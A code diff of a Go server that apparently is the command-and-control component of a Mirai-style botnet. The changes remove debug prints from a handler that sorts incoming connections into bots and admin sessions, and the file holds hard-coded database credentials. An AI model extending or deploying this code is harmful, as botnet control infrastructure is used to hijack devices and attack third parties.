@@ -7,7 +7,7 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"//"192.168.11.150"
+const DatabaseAddr string   = "127.0.0.1"  // "192.168.11.150"
 
 const DatabaseUser string   = "root"
 const DatabasePass string   = "pass"
@@ -36,7 +36,6 @@ func main() {
 }
 
 func initialHandler(conn net.Conn) {
-    fmt.Println("[main]initialHandler")
     defer conn.Close()
     conn.SetDeadline(time.Now().Add(10 * time.Second))
     buf := make([]byte, 32)
@@ -49,7 +48,6 @@ func initialHandler(conn net.Conn) {
             string_len := make([]byte, 1)
             l, err := conn.Read(string_len)
             if err != nil || l <= 0 {
-                    fmt.Println("[main]initialHandler return 1")
                 return
             }
             var source string
@@ -57,19 +55,15 @@ func initialHandler(conn net.Conn) {
                 source_buf := make([]byte, string_len[0])
                 l, err := conn.Read(source_buf)
                 if err != nil || l <= 0 {
-                        fmt.Println("[main]initialHandler retun2")
                     return
                 }
                 source = string(source_buf)
             }
-                fmt.Println("[main]initialHandler1")
             NewBot(conn, buf[3], source).Handle()
         } else {
-                fmt.Println("[main]initialHandler2")
             NewBot(conn, buf[3], "").Handle()
         }
     } else {
-            fmt.Println("[main]initialHandler3")
         NewAdmin(conn).Handle()
     }
 }
